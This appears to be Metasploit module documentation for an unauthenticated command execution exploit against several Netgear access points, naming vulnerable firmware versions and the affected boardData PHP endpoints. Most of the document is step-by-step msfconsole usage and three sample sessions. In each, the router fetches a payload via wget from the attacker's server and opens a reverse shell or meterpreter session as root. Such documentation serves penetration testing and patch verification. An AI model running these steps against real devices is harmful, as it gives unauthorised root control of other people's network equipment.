## Description


The module leverages an unauthenticated arbitrary command execution vulnerability in Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350, WNDAP360, and WNDAP660 before 3.5.5.0. The vulnerability occurs within how the router handles POST requests from (1) boardData102.php, (2) boardData103.php, (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php. The vulnerability was discovered by Daming Dominic Chen, creator of FIRMADYNE (https://github.com/firmadyne/firmadyne).

## Vulnerable Application


  1. Start msfconsole
  2. Do : `use exploit/linux/http/netgear_unauth_exec`
  3. Do : `set RHOST [RouterIP]`
  4. Do : `set SRVHOST [Your server's IP]` if your payload isn't being hosted on another system
  5. Do : `set LHOST [Your IP]`
  6. Do : `set MAC_ADDRESS [12 digit number]` if you want some specific MAC address instead of a random one
  7. Do : `set TARGETURI [target URI]` if you want to target another URI instead of the default `boardDataWW.php`
  8. Do : `set PAYLOAD linux/mipsbe/meterpreter/reverse_tcp` if you want meterpreter session
  9. Do : `exploit`
  10. If router is vulnerable, payload should be dropped via wget (the default HTTP stager) and executed, and you should obtain a session


## Example with default payload (linux/mipsbe/shell_reverse_tcp)

```
msf > use exploit/linux/http/netgear_unauth_exec 
msf exploit(linux/http/netgear_unauth_exec) > set RHOST 192.168.200.100
RHOST => 192.168.200.100
msf exploit(linux/http/netgear_unauth_exec) > set LHOST 192.168.200.99
LHOST => 192.168.200.99
msf exploit(linux/http/netgear_unauth_exec) > set SRVHOST 192.168.200.99
SRVHOST => 192.168.200.99
msf exploit(linux/http/netgear_unauth_exec) > exploit

[*] Started reverse TCP handler on 192.168.200.99:4444 
[*] Using URL: http://192.168.200.99:8080/Ekvrz8LbW
[*] Client 192.168.200.100 (Wget) requested /Ekvrz8LbW
[*] Sending payload to 192.168.200.100 (Wget)
[*] Command shell session 1 opened (192.168.200.99:4444 -> 192.168.200.100:56852) at 2018-10-09 20:24:56 +0630
[*] Command Stager progress - 118.97% done (138/116 bytes)
[*] Server stopped.

uname -a
Linux netgear123456 2.6.32.70 #1 Thu Feb 18 01:39:21 UTC 2016 mips unknown
id
uid=0(root) gid=0(root)

```

## Example with meterpreter (linux/mipsbe/meterpreter/reverse_tcp)

```
msf > use exploit/linux/http/netgear_unauth_exec 
msf exploit(linux/http/netgear_unauth_exec) > set RHOST 192.168.200.100
RHOST => 192.168.200.100
msf exploit(linux/http/netgear_unauth_exec) > set PAYLOAD linux/mipsbe/meterpreter/reverse_tcp
PAYLOAD => linux/mipsbe/meterpreter/reverse_tcp
msf exploit(linux/http/netgear_unauth_exec) > set LHOST 192.168.200.99
LHOST => 192.168.200.99
msf exploit(linux/http/netgear_unauth_exec) > set SRVHOST 192.168.200.99
SRVHOST => 192.168.200.99
msf exploit(linux/http/netgear_unauth_exec) > exploit

[*] Started reverse TCP handler on 192.168.200.99:4444 
[*] Using URL: http://192.168.200.99:8080/x6ZYzUoe9x7IR
[*] Client 192.168.200.100 (Wget) requested /x6ZYzUoe9x7IR
[*] Sending payload to 192.168.200.100 (Wget)
[*] Sending stage (1108408 bytes) to 192.168.200.100
[*] Meterpreter session 1 opened (192.168.200.99:4444 -> 192.168.200.100:56854) at 2018-10-09 20:26:39 +0630
[*] Command Stager progress - 118.33% done (142/120 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.200.100
OS           :  (Linux 2.6.32.70)
Architecture : mips
BuildTuple   : mips-linux-muslsf
Meterpreter  : mipsbe/linux
meterpreter > getuid 
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > 

```

## Example using some other vulnerable URI (boardDataNA.php)
```
msf > use exploit/linux/http/netgear_unauth_exec 
msf exploit(linux/http/netgear_unauth_exec) > set RHOST 192.168.200.100
RHOST => 192.168.200.100
msf exploit(linux/http/netgear_unauth_exec) > set TARGETURI boardDataNA.php
TARGETURI => boardDataNA.php
msf exploit(linux/http/netgear_unauth_exec) > set LHOST 192.168.200.99
LHOST => 192.168.200.99
msf exploit(linux/http/netgear_unauth_exec) > set SRVHOST 192.168.200.99
SRVHOST => 192.168.200.99
msf exploit(linux/http/netgear_unauth_exec) > exploit

[*] Started reverse TCP handler on 192.168.200.99:4444 
[*] Using URL: http://192.168.200.99:8080/zlJyAS8F1As
[*] Client 192.168.200.100 (Wget) requested /zlJyAS8F1As
[*] Sending payload to 192.168.200.100 (Wget)
[*] Command shell session 1 opened (192.168.200.99:4444 -> 192.168.200.100:56856) at 2018-10-09 20:28:41 +0630
[*] Command Stager progress - 118.64% done (140/118 bytes)
[*] Server stopped.

uname -a
Linux netgear123456 2.6.32.70 #1 Thu Feb 18 01:39:21 UTC 2016 mips unknown
id
uid=0(root) gid=0(root)
```
